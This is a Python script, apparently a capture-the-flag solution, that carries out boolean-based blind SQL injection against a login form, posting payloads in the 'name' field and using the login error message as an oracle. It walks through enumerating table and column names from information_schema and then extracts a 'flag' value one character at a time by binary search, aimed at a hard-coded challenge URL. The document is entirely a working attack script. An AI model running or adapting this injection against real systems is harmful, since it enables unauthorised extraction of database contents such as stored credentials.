import requests

def Get(url):
    sql_data = ""
    result = ''
    for i in range(1,100):
        left = 32
        right = 128
        mid = (left+right)//2
        while left<right:
            #查询表名
            # name = "admin' and if(ascii(mid((Select group_concat(table_name) from information_schema.tables " \
            #        "where table_schema=database()),{0},1))>{1},1,0)#".format(i,mid)

            #查询列名
            # name = "admin' and if(ascii(mid((Select group_concat(column_name) from information_schema.columns " \
            #        "where table_schema=database() and table_name='fl4g'),{0},1))>{1},1,0)#".format(i,mid)

            #根据表名和列名查询字段值
            name = "admin' and if(ascii(mid((Select flag from fl4g),{0},1))>{1},1,0)#".format(i, mid)
            data = {"name":name,"pass":"1223234"}
            res = requests.post(url,data)
            if "\\u8d26\\u53f7\\u6216\\u5bc6\\u7801\\u9519\\u8bef" in res.content.decode(): #正确回显
                left = mid+1 #字段中的字符的ASCII码大于mid值时执行
            else:
                right = mid
            mid = (left+right)//2 #字段中的字符的ASCII码小于或等于mid值时执行
            print("i= {0} , left = {1}, right = {2}, mid = {3}".format(i,left,right,mid))
        #查询结果结束
        if mid==32: # 检测到到达字符串的结尾，所以中断本次循环并i+1
            break
        result += chr(mid)
        print(result)
    print(result)

Get('http://eci-2ze327u4f9r35ohyxr1y.cloudeci1.ichunqiu.com/login.php')